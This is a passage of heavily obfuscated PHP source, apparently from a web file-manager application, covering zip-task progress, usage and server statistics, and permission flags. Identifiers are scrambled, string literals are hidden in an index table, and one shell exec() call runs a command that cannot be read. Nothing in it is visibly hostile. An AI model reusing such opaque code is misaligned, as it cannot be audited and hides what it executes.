$úË¸ƒ“Œ[$—ƒš±¯[$ÄÏÇ•‹[399]]]; $—ƒš±¯[$ÄÏÇ•‹[1873]] = $“  Ò‹ ? $“  Ò‹ : $—ƒš±¯[$ÄÏÇ•‹[1873]]; } unset($—ƒš±¯); return parent::resetData($«†û¹»); } private function getSort($»ØşÂ¹§) { $îòêÕÓ =& $_SERVER[­õöî’–]; $°æ…å§’ = parent::listData(); $ˆÉÑ¸ÙÊ = array_to_keyvalue($°æ…å§’, $îòêÕÓ[12], $îòêÕÓ[1873]); if (!$ˆÉÑ¸ÙÊ) { $ˆÉÑ¸ÙÊ = array(0); } $‚üâ¤ØÆ = $»ØşÂ¹§ == $îòêÕÓ[258] ? max($ˆÉÑ¸ÙÊ) : min($ˆÉÑ¸ÙÊ); return intval($‚üâ¤ØÆ); } } goto A‚î…ÇÕ; eŸØÁ¿¡Ã¬: class TaskZip extends TaskFileTransfer { protected function startAfter() { $ä¯ìèºÄ =& $_SERVER[­õöî’–]; parent::startAfter(); Hook::bind($ä¯ìèºÄ[1776], array($this, $ä¯ìèºÄ[1771])); $Ê³Ş»ß =& $this->task; $Ê³Ş»ß[$ä¯ìèºÄ[1773]] = $ä¯ìèºÄ[1193]; if (!$Ê³Ş»ß[$ä¯ìèºÄ[1560]]) { $Ê³Ş»ß[$ä¯ìèºÄ[1560]] = LNG($ä¯ìèºÄ[1777]); } } protected function endAfter() { $Ô‡Æ¦±è =& $_SERVER[­õöî’–]; parent::endAfter(); Hook::unbind($Ô‡Æ¦±è[1776], array($this, $Ô‡Æ¦±è[1771])); } public function updateAfter() { $§¦¹…Õ =& $_SERVER[­õöî’–]; $‡§äÇñ =& $this->task; if (!$‡§äÇñ[$§¦¹…Õ[777]] || !$‡§äÇñ[$§¦¹…Õ[754]]) { return; } if ($‡§äÇñ[$§¦¹…Õ[1773]] == $§¦¹…Õ[1193]) { $Â´—’í = $‡§äÇñ[$§¦¹…Õ[1714]]; if ($‡§äÇñ[$§¦¹…Õ[1715]] != $§¦¹…Õ[1193]) { $Â´—’í = 0; } $—àçó = ($‡§äÇñ[$§¦¹…Õ[1718]] + $Â´—’í) / $‡§äÇñ[$§¦¹…Õ[754]]; $‡§äÇñ[$§¦¹…Õ[1662]] = $—àçó * 0.3; } else { if ($‡§äÇñ[$§¦¹…Õ[1773]] == $§¦¹…Õ[313]) { $—àçó = $‡§äÇñ[$§¦¹…Õ[1661]] / $‡§äÇñ[$§¦¹…Õ[777]]; $‡§äÇñ[$§¦¹…Õ[1662]] = 0.3 + $—àçó * 0.5; } else { if ($‡§äÇñ[$§¦¹…Õ[1773]] == $§¦¹…Õ[107]) { $—àçó = 0; if ($‡§äÇñ[$§¦¹…Õ[1713]]) { $—àçó = $‡§äÇñ[$§¦¹…Õ[1714]] / $‡§äÇñ[$§¦¹…Õ[1713]]; } $‡§äÇñ[$§¦¹…Õ[1662]] = 0.3 + 0.5 + $—àçó * 0.2; } } } if ($‡§äÇñ[$§¦¹…Õ[1662]] > 0) { $ŸòÌ°Á = timeFloat() - $‡§äÇñ[$§¦¹…Õ[1664]] - $‡§äÇñ[$§¦¹…Õ[1667]]; $‡§äÇñ[$§¦¹…Õ[1668]] = $ŸòÌ°Á * (1 - $‡§äÇñ[$§¦¹…Õ[1662]]) / $‡§äÇñ[$§¦¹…Õ[1662]]; } } public function copyFileStart($Ä¿ÃŠ‹Ã, $ö§îã’Ù, $øŸàñ¶İ, $©Ò•Ñ·–, $µ’¹·€, $‹±¥®“â) { $äœ©œÅƒ =& $_SERVER[­õöî’–]; parent::copyFileStart($Ä¿ÃŠ‹Ã, $ö§îã’Ù, $øŸàñ¶İ, $©Ò•Ñ·–, $µ’¹·€, $‹±¥®“â); $õã ÛÙ‘ =& $this->task; if ($õã ÛÙ‘[$äœ©œÅƒ[1773]] == $äœ©œÅƒ[313]) { $õã ÛÙ‘[$äœ©œÅƒ[1773]] = $äœ©œÅƒ[107]; } $this->update(); } public function copyFileEnd($“Øô¦€€, $ã†¹ëÈ, $ğ¦ü˜–Œ, $„¿÷ƒ°ê, $®…é¼, $ÍÉŠˆÛ§) { $Œ§Ğ’ÒŠ =& $_SERVER[­õöî’–]; $éØÈçâÌ =& $this->task; $éØÈçâÌ[$Œ§Ğ’ÒŠ[1714]] = $éØÈçâÌ[$Œ§Ğ’ÒŠ[1713]]; $éØÈçâÌ[$Œ§Ğ’ÒŠ[1718]] += $éØÈçâÌ[$Œ§Ğ’ÒŠ[1713]]; $éØÈçâÌ[$Œ§Ğ’ÒŠ[1715]] = $Œ§Ğ’ÒŠ[12]; $this->update(); } public function nameParse($ó»ëù‘) { $Æ·’ó°í =& $_SERVER[­õöî’–]; $™ÒÌ²÷ =& $this->task; if ($™ÒÌ²÷[$Æ·’ó°í[1661]] < $™ÒÌ²÷[$Æ·’ó°í[777]]) { $’†­œˆè = get_path_this($ó»ëù‘); if (strstr($’†­œˆè, $Æ·’ó°í[10])) { $™ÒÌ²÷[$Æ·’ó°í[1661]] += 1; } } if ($™ÒÌ²÷[$Æ·’ó°í[1773]] == $Æ·’ó°í[1193]) { $™ÒÌ²÷[$Æ·’ó°í[1773]] = $Æ·’ó°í[313]; } $™ÒÌ²÷[$Æ·’ó°í[1711]] = $ó»ëù‘; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($ÂØíÅ™à) { $İ÷¹•ÑÇ =& $_SERVER[­õöî’–]; $¼ïŒğ•Ñ = array($İ÷¹•ÑÇ[600] => array($İ÷¹•ÑÇ[33] => $İ÷¹•ÑÇ[1778], $İ÷¹•ÑÇ[273] => array($İ÷¹•ÑÇ[224], $İ÷¹•ÑÇ[756], $İ÷¹•ÑÇ[1779], $İ÷¹•ÑÇ[1780])), $İ÷¹•ÑÇ[1781] => array($İ÷¹•ÑÇ[33] => $İ÷¹•ÑÇ[1782], $İ÷¹•ÑÇ[273] => array($İ÷¹•ÑÇ[224], $İ÷¹•ÑÇ[754], $İ÷¹•ÑÇ[1783], $İ÷¹•ÑÇ[1784], $İ÷¹•ÑÇ[1785]))); if (!isset($¼ïŒğ•Ñ[$ÂØíÅ™à])) { return !1; } $this->optionType = $¼ïŒğ•Ñ[$ÂØíÅ™à][$İ÷¹•ÑÇ[33]]; $this->field = $¼ïŒğ•Ñ[$ÂØíÅ™à][$İ÷¹•ÑÇ[273]]; return !0; } public function listData($çßıç½ = false, $Æ¹«ã½ = "\155\157\144\x69\x66\171\124\x69\155\145", $Ú™²ÕÈÆ = false) { return parent::listData($çßıç½, $Æ¹«ã½, $Ú™²ÕÈÆ); } public function trendList($ê×öÙ) { $íï¡ó•Ä =& $_SERVER[­õöî’–]; $Ë§œßŠê = $this->listData(); if ($Ë§œßŠê) { $¢¥¼Ù‚ = end($Ë§œßŠê); $öšîï©¨ = date($íï¡ó•Ä[1786], strtotime($íï¡ó•Ä[1787])); if ($¢¥¼Ù‚[$íï¡ó•Ä[224]] == $öšîï©¨) { return $Ë§œßŠê; } $°íË¯˜÷ = strtotime($¢¥¼Ù‚[$íï¡ó•Ä[224]]); } if (!isset($°íË¯˜÷)) { $·ÇÓÔ = $ê×öÙ == $íï¡ó•Ä[600] ? $íï¡ó•Ä[535] : $íï¡ó•Ä[816]; $°íË¯˜÷ = Model($·ÇÓÔ)->min($íï¡ó•Ä[200]); } $Ó»©Ğš¶ = $íï¡ó•Ä[1788] . ucfirst($ê×öÙ); $Ğ’éíõ¬ = $this->dateList($°íË¯˜÷); foreach ($Ğ’éíõ¬ as $öšîï©¨) { $this->{$Ó»©Ğš¶}($öšîï©¨); } return $this->listData(); } private function dateList($äùã£²Œ) { $ôÈÑÓ¥ä =& $_SERVER[­õöî’–]; $çÜµ‰¡Ñ = $äùã£²Œ; $ûÈŸæûï = strtotime($ôÈÑÓ¥ä[1787]); $Å¤ÂÍ¢À = array(); while ($çÜµ‰¡Ñ <= $ûÈŸæûï) { $Å¤ÂÍ¢À[] = date($ôÈÑÓ¥ä[1786], $çÜµ‰¡Ñ); $çÜµ‰¡Ñ = strtotime($ôÈÑÓ¥ä[1789], $çÜµ‰¡Ñ); } return $Å¤ÂÍ¢À; } public function _recordUser($…ã˜ğ¼¸ = '') { $œ¥ÔÜî¸ =& $_SERVER[­õöî’–]; $ÌÍ–è»® = strtotime(date($œ¥ÔÜî¸[1790], strtotime($…ã˜ğ¼¸))); $–ª°¾ÃÓ = strtotime(date($œ¥ÔÜî¸[1791], strtotime($…ã˜ğ¼¸))); $¼€‚Æâ¿ = array($œ¥ÔÜî¸[200] => array($œ¥ÔÜî¸[1011], $–ª°¾ÃÓ)); $á“ÍÆÌ³ = Model($œ¥ÔÜî¸[535])->where($¼€‚Æâ¿)->count($œ¥ÔÜî¸[1660]); $¼€‚Æâ¿[$œ¥ÔÜî¸[200]] = array($œ¥ÔÜî¸[333], array($ÌÍ–è»®, $–ª°¾ÃÓ)); $®©å•ùĞ = Model($œ¥ÔÜî¸[535])->where($¼€‚Æâ¿)->count($œ¥ÔÜî¸[1660]); $¼€‚Æâ¿[$œ¥ÔÜî¸[33]] = $œ¥ÔÜî¸[1792]; $«ŸÆóÒÈ = Model($œ¥ÔÜî¸[1793])->where($¼€‚Æâ¿)->count($œ¥ÔÜî¸[1794]); $Êı¡¨¦ = array($œ¥ÔÜî¸[224] => $…ã˜ğ¼¸, $œ¥ÔÜî¸[756] => (int) $á“ÍÆÌ³, $œ¥ÔÜî¸[1779] => (int) $®©å•ùĞ, $œ¥ÔÜî¸[1780] => (int) $«ŸÆóÒÈ); return $this->insert($Êı¡¨¦); } public function _recordStore($Æ¶ØÎµÔ = '') { $¶³˜Òüê =& $_SERVER[­õöî’–]; $‹…Ù¦ı‰ = strtotime(date($¶³˜Òüê[1791], strtotime($Æ¶ØÎµÔ))); $ìŸ€ç¿ã = array($¶³˜Òüê[200] => array($¶³˜Òüê[1011], $‹…Ù¦ı‰)); $Ôç÷ğß = Model($¶³˜Òüê[471])->where($ìŸ€ç¿ã)->sum($¶³˜Òüê[76]); $ìŸ€ç¿ã[$¶³˜Òüê[410]] = 0; $áÃÍºˆ© = Model($¶³˜Òüê[816])->where($ìŸ€ç¿ã)->sum($¶³˜Òüê[76]); $ìŸ€ç¿ã[$¶³˜Òüê[411]] = 1; $¯úÏõÁ¼ = Model($¶³˜Òüê[816])->where($ìŸ€ç¿ã)->sum($¶³˜Òüê[76]); $ìŸ€ç¿ã[$¶³˜Òüê[411]] = 2; $µÈŠ·‚‚ = Model($¶³˜Òüê[816])->where($ìŸ€ç¿ã)->sum($¶³˜Òüê[76]); $±„À“ƒ• = array($¶³˜Òüê[224] => $Æ¶ØÎµÔ, $¶³˜Òüê[754] => (int) $áÃÍºˆ©, $¶³˜Òüê[1783] => (int) $Ôç÷ğß, $¶³˜Òüê[1784] => (int) $¯úÏõÁ¼, $¶³˜Òüê[1785] => (int) $µÈŠ·‚‚); return $this->insert($±„À“ƒ•); } public function trend($´Ç³ÓÚ, $ßó¦ó¸Ğ) { $Æ¬õ¦Ğã =& $_SERVER[­õöî’–]; if (!$this->init($´Ç³ÓÚ)) { return !1; } $Ä¬Ç…ù¬ = $this->trendList($´Ç³ÓÚ); if ($Ä¬Ç…ù¬ && $ßó¦ó¸Ğ != $Æ¬õ¦Ğã[1633]) { $É“¡§—‡ = $Ä¬Ç…ù¬[0][$Æ¬õ¦Ğã[224]]; $Ïµ§õê‘ = $this->validDate($ßó¦ó¸Ğ, $É“¡§—‡); $ºê ê¼“ = array(); $ˆÁàş‘À = array_to_keyvalue($Ä¬Ç…ù¬, $Æ¬õ¦Ğã[224]); foreach ($Ïµ§õê‘ as $‰ Äñò¼) { if (isset($ˆÁàş‘À[$‰ Äñò¼])) { $ÆêàÆ© = $ˆÁàş‘À[$‰ Äñò¼]; } else { $ÆêàÆ© = end($Ä¬Ç…ù¬); $ÆêàÆ©[$Æ¬õ¦Ğã[224]] = $‰ Äñò¼; if ($´Ç³ÓÚ == $Æ¬õ¦Ğã[600]) { $ÆêàÆ©[$Æ¬õ¦Ğã[1779]] = $ÆêàÆ©[$Æ¬õ¦Ğã[1780]] = 0; } } $ºê ê¼“[] = $ÆêàÆ©; } $Ä¬Ç…ù¬ = $ºê ê¼“; } $¸…ìûÔ = array($Æ¬õ¦Ğã[600] => array($Æ¬õ¦Ğã[756] => LNG($Æ¬õ¦Ğã[1795]), $Æ¬õ¦Ğã[1779] => LNG($Æ¬õ¦Ğã[1796]), $Æ¬õ¦Ğã[1780] => LNG($Æ¬õ¦Ğã[1797])), $Æ¬õ¦Ğã[1781] => array($Æ¬õ¦Ğã[754] => LNG($Æ¬õ¦Ğã[1798]), $Æ¬õ¦Ğã[1783] => LNG($Æ¬õ¦Ğã[1799]), $Æ¬õ¦Ğã[1784] => LNG($Æ¬õ¦Ğã[1800]), $Æ¬õ¦Ğã[1785] => LNG($Æ¬õ¦Ğã[1801]))); $˜˜Š‘Î = array($Æ¬õ¦Ğã[600] => $Æ¬õ¦Ğã[1802], $Æ¬õ¦Ğã[1781] => $Æ¬õ¦Ğã[76]); if (empty($Ä¬Ç…ù¬)) { $‰ Äñò¼ = date($Æ¬õ¦Ğã[1786], strtotime($Æ¬õ¦Ğã[1787])); $ØÑüÙÕ÷ = array($Æ¬õ¦Ğã[224] => $‰ Äñò¼); foreach ($¸…ìûÔ[$´Ç³ÓÚ] as $”çŸ¯õı => $¸é¼€Ì“) { $ØÑüÙÕ÷[$”çŸ¯õı] = 0; } $Ä¬Ç…ù¬[] = $ØÑüÙÕ÷; } $‡èßÑç¥ = array(); foreach ($Ä¬Ç…ù¬ as $¸é¼€Ì“) { if ($´Ç³ÓÚ == $Æ¬õ¦Ğã[1781] && $¸é¼€Ì“[$Æ¬õ¦Ğã[1783]] > $¸é¼€Ì“[$Æ¬õ¦Ğã[754]]) { $¸é¼€Ì“[$Æ¬õ¦Ğã[1783]] = $¸é¼€Ì“[$Æ¬õ¦Ğã[754]]; } foreach ($¸…ìûÔ[$´Ç³ÓÚ] as $”çŸ¯õı => $‹Ğ½£ê) { $ÆêàÆ© = array($Æ¬õ¦Ğã[224] => $¸é¼€Ì“[$Æ¬õ¦Ğã[224]], $Æ¬õ¦Ğã[1560] => $‹Ğ½£ê); $ÆêàÆ©[$˜˜Š‘Î[$´Ç³ÓÚ]] = isset($¸é¼€Ì“[$”çŸ¯õı]) ? $¸é¼€Ì“[$”çŸ¯õı] : 0; $‡èßÑç¥[] = $ÆêàÆ©; } } return $‡èßÑç¥; } public function validDate($­ƒ’èŸÔ, $ö©›®Îô) { $ùûØõ… =& $_SERVER[­õöî’–]; $Ê´şËéö = date($ùûØõ…[1786], strtotime($ùûØõ…[1787])); $°ŸöÑ = array($Ê´şËéö); switch ($­ƒ’èŸÔ) { case $ùûØõ…[1640]: $´…á—ô = mktime(0, 0, 0, date($ùûØõ…[1803]), date($ùûØõ…[1382]) - date($ùûØõ…[1445]) + 7 - 7, date($ùûØõ…[1804])); $Ë‹àĞ× = 0; do { $´ÑÇôÈÊ = date($ùûØõ…[1786], $´…á—ô - 3600 * 24 * 7 * $Ë‹àĞ×); $°ŸöÑ[] = $´ÑÇôÈÊ; $Ë‹àĞ×++; } while ($ö©›®Îô < $´ÑÇôÈÊ); break; case $ùûØõ…[1638]: $Ë‹àĞ× = 1; do { $ˆ¨¥“‘Î = date($ùûØõ…[1805], strtotime("\55\x20{$Ë‹àĞ×}\x20\155\157\156\x74\150\163")); $°ŸöÑ[] = $ˆ¨¥“‘Î; $Ë‹àĞ×++; } while ($ö©›®Îô < $ˆ¨¥“‘Î); break; case $ùûØõ…[1806]: $«ƒŒë›Ã = (int) date($ùûØõ…[1804], strtotime($ö©›®Îô)); $Ş‚„®„Å = (int) date($ùûØõ…[1804]); if ($«ƒŒë›Ã >= $Ş‚„®„Å) { break; } for ($«ƒŒë›Ã; $«ƒŒë›Ã < $Ş‚„®„Å; $«ƒŒë›Ã++) { $°ŸöÑ[] = $«ƒŒë›Ã . $ùûØõ…[1807]; } break; default: break; } if ($ö©›®Îô > end($°ŸöÑ)) { array_pop($°ŸöÑ); } sort($°ŸöÑ); return $°ŸöÑ; } public function listTable($ç¦ÊÒ÷˜) { $ŸÒ±Ë‚ = ucfirst($ç¦ÊÒ÷˜); return Model($ŸÒ±Ë‚)->listData(); } public function option($‹ë’şÙ) { $Í³ö‡‘— = $_SERVER[­õöî’–][1808] . ucfirst($‹ë’şÙ); return $this->{$Í³ö‡‘—}(); } private function optionUser() { $å¥¹ä–¦ =& $_SERVER[­õöî’–]; $À…è”Ü = Model($å¥¹ä–¦[535])->count($å¥¹ä–¦[1660]); $Å³½‚Îí = Model($å¥¹ä–¦[535])->where($å¥¹ä–¦[1809])->count($å¥¹ä–¦[1660]); $…×¶»Ø… = intval($GLOBALS[$å¥¹ä–¦[6]][$å¥¹ä–¦[349]][$å¥¹ä–¦[1615]]) / 3600; $­×†£»Î = strtotime("\x2d{$…×¶»Ø…}\40\x68\x6f\165\x72\x73"); $‡”ê…¯ü = strtotime(date($å¥¹ä–¦[1790])); if ($­×†£»Î < $‡”ê…¯ü) { $­×†£»Î = $‡”ê…¯ü; } $ä°ÈÁÙş = array($å¥¹ä–¦[1810] => array($å¥¹ä–¦[1012], $­×†£»Î)); $ÕÈÓç†ñ = (int) Model($å¥¹ä–¦[535])->where($ä°ÈÁÙş)->count($å¥¹ä–¦[1660]); if (!$ÕÈÓç†ñ) { $ÕÈÓç†ñ = 1; } $ä°ÈÁÙş = array($å¥¹ä–¦[1810] => array($å¥¹ä–¦[1012], $‡”ê…¯ü)); $ı«Ò´à = Model($å¥¹ä–¦[535])->where($ä°ÈÁÙş)->count($å¥¹ä–¦[1660]); return array($å¥¹ä–¦[750] => (int) $À…è”Ü, $å¥¹ä–¦[1811] => (int) ($À…è”Ü - $Å³½‚Îí), $å¥¹ä–¦[1812] => (int) $Å³½‚Îí, $å¥¹ä–¦[1813] => (int) $ı«Ò´à, $å¥¹ä–¦[1814] => $ÕÈÓç†ñ); } private function optionFile() { $åÛ×Éğ =& $_SERVER[­õöî’–]; $¯ÒÈ¶ = $this->sourceSize(); $ç›±¯¤„ = $¯ÒÈ¶[$åÛ×Éğ[76]]; $¿ÒëÖÁ¹ = $¯ÒÈ¶[$åÛ×Éğ[1783]]; $¤ÙÅô„ = Model($åÛ×Éğ[816])->where(array($åÛ×Éğ[410] => 0))->count($åÛ×Éğ[402]); $¯ÏüúÆÅ = array($åÛ×Éğ[410] => 0, $åÛ×Éğ[200] => array($åÛ×Éğ[1012], strtotime(date($åÛ×Éğ[1790])))); $‡£çšİ = Model($åÛ×Éğ[816])->where($¯ÏüúÆÅ)->sum($åÛ×Éğ[76]); $œì·éÀ’ = Model($åÛ×Éğ[816])->where($¯ÏüúÆÅ)->count($åÛ×Éğ[402]); return array($åÛ×Éğ[754] => $ç›±¯¤„, $åÛ×Éğ[1783] => $¿ÒëÖÁ¹, $åÛ×Éğ[1815] => $ç›±¯¤„ - $¿ÒëÖÁ¹, $åÛ×Éğ[1816] => (int) $‡£çšİ, $åÛ×Éğ[756] => (int) $¤ÙÅô„, $åÛ×Éğ[1817] => (int) $œì·éÀ’); } private function optionAccess() { $­æÛØÉ… =& $_SERVER[­õöî’–]; return array($­æÛØÉ…[750] => $this->typeLogCnt(), $­æÛØÉ…[107] => $this->typeLogCnt($­æÛØÉ…[107]), $­æÛØÉ…[452] => $this->typeLogCnt($­æÛØÉ…[452]), $­æÛØÉ…[1818] => $this->typeLogCnt($­æÛØÉ…[1818]), $­æÛØÉ…[1819] => $this->typeLogCnt($­æÛØÉ…[1819]), $­æÛØÉ…[600] => $this->typeLogCnt($­æÛØÉ…[12], $­æÛØÉ…[1794])); } private function typeLogCnt($·Ôß‘™œ = '', $Çìî·¹ = "\151\144") { $ëñÙÉè¥ =& $_SERVER[­õöî’–]; $éğÑŠ‡ = array($ëñÙÉè¥[107] => array($ëñÙÉè¥[1820], $ëñÙÉè¥[1821]), $ëñÙÉè¥[452] => array($ëñÙÉè¥[1822], $ëñÙÉè¥[1823]), $ëñÙÉè¥[1818] => array($ëñÙÉè¥[1824], $ëñÙÉè¥[1825], $ëñÙÉè¥[1826]), $ëñÙÉè¥[1819] => array($ëñÙÉè¥[1827], $ëñÙÉè¥[1828]), $ëñÙÉè¥[1829] => array($ëñÙÉè¥[1830], $ëñÙÉè¥[1831], $ëñÙÉè¥[1832])); $ÑèÁ²Ãô = strtotime(date($ëñÙÉè¥[1790])); $ÏŒŠÙ§Õ = array($ëñÙÉè¥[200] => array($ëñÙÉè¥[1012], $ÑèÁ²Ãô)); if ($·Ôß‘™œ) { $ÏŒŠÙ§Õ[$ëñÙÉè¥[33]] = array($ëñÙÉè¥[7], $éğÑŠ‡[$·Ôß‘™œ]); } $¸ú©¿ Ú = Model($ëñÙÉè¥[1793])->where($ÏŒŠÙ§Õ)->count($Çìî·¹); return (int) $¸ú©¿ Ú; } private function optionServer() { $ìûİÍ¹× =& $_SERVER[­õöî’–]; $„ñ€ïõ· = $this->diskDriver(); $Ïç¦²ÀÙ = KodIO::defaultDriver(); $®ËıÃÎ¬ = array($ìûİÍ¹×[808] => $Ïç¦²ÀÙ[$ìûİÍ¹×[399]]); $¾Ï™ş–¹ = Model($ìûİÍ¹×[471])->where($®ËıÃÎ¬)->sum($ìûİÍ¹×[76]); $†º¥¢ºÇ = explode($ìûİÍ¹×[53], $_SERVER[$ìûİÍ¹×[143]]); $ƒå²®î = $†º¥¢ºÇ[0]; $ä˜·‰…¤ = $GLOBALS[$ìûİÍ¹×[6]][$ìûİÍ¹×[21]]; $¦²ÑĞ³“ = $ä˜·‰…¤[$ìûİÍ¹×[974]]; if ($¦²ÑĞ³“ == $ìûİÍ¹×[962]) { $ÈíúµÓ† = explode($ìûİÍ¹×[1278], $ä˜·‰…¤[$ìûİÍ¹×[973]]); $¦²ÑĞ³“ = $ÈíúµÓ†[0]; } if ($¦²ÑĞ³“ == $ìûİÍ¹×[909] || $¦²ÑĞ³“ == $ìûİÍ¹×[795]) { $¿¢ñ´ Ø = Model()->db()->query($ìûİÍ¹×[1833]); $«ş˜Òú¡ = $¿¢ñ´ Ø[0] && isset($¿¢ñ´ Ø[0][$ìûİÍ¹×[1559]]) ? $¿¢ñ´ Ø[0][$ìûİÍ¹×[1559]] : 0; $¦²ÑĞ³“ = $ìûİÍ¹×[1834] . ($«ş˜Òú¡ ? $ìûİÍ¹×[8] . $«ş˜Òú¡ : $ìûİÍ¹×[12]); } $ãäÁí¡– = $GLOBALS[$ìûİÍ¹×[6]][$ìûİÍ¹×[349]][$ìûİÍ¹×[818]]; return array($ìûİÍ¹×[1835] => $„ñ€ïõ· ? $„ñ€ïõ·[$ìûİÍ¹×[1836]] : 0, $ìûİÍ¹×[1837] => $„ñ€ïõ· ? $„ñ€ïõ·[$ìûİÍ¹×[1838]] : 0, $ìûİÍ¹×[1839] => (int) $Ïç¦²ÀÙ[$ìûİÍ¹×[1836]] * 1024 * 1024 * 1024, $ìûİÍ¹×[1840] => (int) $¾Ï™ş–¹, $ìûİÍ¹×[1841] => ucfirst($ƒå²®î), $ìûİÍ¹×[1842] => $ìûİÍ¹×[1843] . PHP_VERSION, $ìûİÍ¹×[1844] => phpBuild64() ? 64 : 32, $ìûİÍ¹×[749] => str_replace($ìûİÍ¹×[1128], $ìûİÍ¹×[990], $¦²ÑĞ³“), $ìûİÍ¹×[349] => ucfirst($ãäÁí¡–), $ìûİÍ¹×[32] => $_SERVER[$ìûİÍ¹×[1845]]); } private function diskDriver() { $º¾ı è§ =& $_SERVER[­õöî’–]; $êĞÈÃ°ü = $º¾ı è§[8]; $üÌ‚¢û = $GLOBALS[$º¾ı è§[6]][$º¾ı è§[1295]] == $º¾ı è§[1296]; if ($üÌ‚¢û) { $êĞÈÃ°ü = $º¾ı è§[1846]; if (function_exists($º¾ı è§[1847])) { exec($º¾ı è§[1848], $ŸÓ›¾õò); $êĞÈÃ°ü = $ŸÓ›¾õò[1] . $º¾ı è§[8]; } } if (!file_exists($êĞÈÃ°ü)) { return; } $ü¡…³£ = @disk_total_space($êĞÈÃ°ü); $è¦—ª—§ = $ü¡…³£ - @disk_free_space($êĞÈÃ°ü); return array($º¾ı è§[1836] => $ü¡…³£, $º¾ı è§[1838] => $è¦—ª—§); } public function fileChart($ıÉÔ†ÊÅ) { $¬²Ù… =& $_SERVER[­õöî’–]; if (isset($ıÉÔ†ÊÅ[$¬²Ù…[1660]])) { return Model($¬²Ù…[816])->userFileTypeProfile($ıÉÔ†ÊÅ[$¬²Ù…[1660]]); } if (isset($ıÉÔ†ÊÅ[$¬²Ù…[1849]])) { return Model($¬²Ù…[816])->groupFileTypeProfile($ıÉÔ†ÊÅ[$¬²Ù…[1849]]); } $¤ÑµÎ€Ò = $this->sourceSize(); $Ç¤‡ŒŠ‡ = array($¬²Ù…[432] => 0, $¬²Ù…[411] => 1); $™ê¢«—ƒ = Model($¬²Ù…[816])->where($Ç¤‡ŒŠ‡)->sum($¬²Ù…[76]); $Ç¤‡ŒŠ‡[$¬²Ù…[411]] = 2; $šüªÇªß = Model($¬²Ù…[816])->where($Ç¤‡ŒŠ‡)->sum($¬²Ù…[76]); return array($¬²Ù…[754] => $¤ÑµÎ€Ò[$¬²Ù…[76]], $¬²Ù…[1783] => $¤ÑµÎ€Ò[$¬²Ù…[1783]], $¬²Ù…[1784] => (int) $™ê¢«—ƒ, $¬²Ù…[1785] => (int) $šüªÇªß); } private function sourceSize() { $‡¶Ğ™´ =& $_SERVER[­õöî’–]; $°ÏšÓØ· = Model($‡¶Ğ™´[816])->where(array($‡¶Ğ™´[410] => 0))->sum($‡¶Ğ™´[76]); $¤ÄşÕ»‚ = Model($‡¶Ğ™´[471])->sum($‡¶Ğ™´[76]); if ($¤ÄşÕ»‚ > $°ÏšÓØ·) { $¤ÄşÕ»‚ = $°ÏšÓØ·; } return array($‡¶Ğ™´[76] => (int) $°ÏšÓØ·, $‡¶Ğ™´[1783] => (int) $¤ÄşÕ»‚); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $î¥Îå‘ß =& $_SERVER[­õöî’–]; $ĞŠÃ¼‹’ = array(array($î¥Îå‘ß[420] => LNG($î¥Îå‘ß[1850]), $î¥Îå‘ß[1851] => $î¥Îå‘ß[1852], $î¥Îå‘ß[1853] => 1, $î¥Îå‘ß[1854] => 1, $î¥Îå‘ß[1855] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($î¥Îå‘ß[420] => LNG($î¥Îå‘ß[1856]), $î¥Îå‘ß[1851] => $î¥Îå‘ß[1857], $î¥Îå‘ß[1853] => 2, $î¥Îå‘ß[1854] => 1, $î¥Îå‘ß[1855] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($î¥Îå‘ß[420] => LNG($î¥Îå‘ß[1858]), $î¥Îå‘ß[1851] => $î¥Îå‘ß[1859], $î¥Îå‘ß[1853] => 3, $î¥Îå‘ß[1854] => 1, $î¥Îå‘ß[1855] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($î¥Îå‘ß[420] => LNG($î¥Îå‘ß[1860]), $î¥Îå‘ß[1851] => $î¥Îå‘ß[1861], $î¥Îå‘ß[1853] => 4, $î¥Îå‘ß[1854] => 1, $î¥Îå‘ß[1855] => self::AUTH_SHOW | self::AUTH_VIEW), array($î¥Îå‘ß[420] => LNG($î¥Îå‘ß[1862]), $î¥Îå‘ß[1851] => $î¥Îå‘ß[1863], $î¥Îå‘ß[1853] => 5, $î¥Îå‘ß[1854] => 1, $î¥Îå‘ß[1855] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($î¥Îå‘ß[420] => LNG($î¥Îå‘ß[1864]), $î¥Îå‘ß[1851] => $î¥Îå‘ß[1865], $î¥Îå‘ß[1853] => 6, $î¥Îå‘ß[1854] => 1, $î¥Îå‘ß[1855] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($î¥Îå‘ß[420] => LNG($î¥Îå‘ß[1866]), $î¥Îå‘ß[1851] => $î¥Îå‘ß[1867], $î¥Îå‘ß[1853] => 7, $î¥Îå‘ß[1854] => 1, $î¥Îå‘ß[1855] => 0)); return $ĞŠÃ¼‹’; } public static function authCheck($‰üù“‚ğ, $ƒçí†¥ë) { $Èø”ù =& $_SERVER[­õöî’–]; $‰üù“‚ğ = intval($‰üù“‚ğ); if ($GLOBALS[$Èø”ù[503]] && $GLOBALS[$Èø”ù[6]][$Èø”ù[1868]]) { return !0; } if ($‰üù“‚ğ <= 0) { return !1; } if (($‰üù“‚ğ & self::AUTH_ROOT) == self::AUTH_ROOT) { return 